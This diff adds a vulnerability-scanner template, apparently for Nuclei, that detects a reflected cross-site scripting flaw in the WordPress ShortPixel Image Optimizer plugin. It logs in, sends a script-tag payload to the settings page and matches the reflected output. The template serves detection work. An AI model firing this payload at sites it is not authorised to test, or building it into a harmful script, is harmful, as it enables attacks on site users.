@@ -1,0 +1,49 @@
+id: shortpixel-image-optimizer-xss
+
+info:
+  name: WordPress ShortPixel Image Optimizer <4.22.10 - Cross-Site Scripting
+  author: Akincibor
+  severity: medium
+  description: WordPress ShortPixel Image Optimizer 4.22.10 does not escape generated URLs before outputting them back in an attribute, leading to reflected cross-site scripting.
+  reference:
+    - https://wpscan.com/vulnerability/8a0ddd14-7260-4fb6-bb87-2916aa41ff01
+    - https://wordpress.org/plugins/shortpixel-image-optimiser
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    verified: true
+    max-request: 2
+  tags: shortpixel,authenticated,wpscan,xss,wp-plugin,wp,wordpress
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/options-general.php?page=wp-shortpixel-settings&"><script>alert(1)</script> HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '&\"><script>alert(1)</script>&noheader=true&sp-action'
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502207081dad3b8cda864695d25fb500ce5ef36343ffe7f3c4b35146d34ec2bd6be79022100fd0ec15d7105f1e5e451b88194a97fb9821ed3d0eb6eccc4158f657d06de1692:922c64590222798bb761d5b6d8e72950
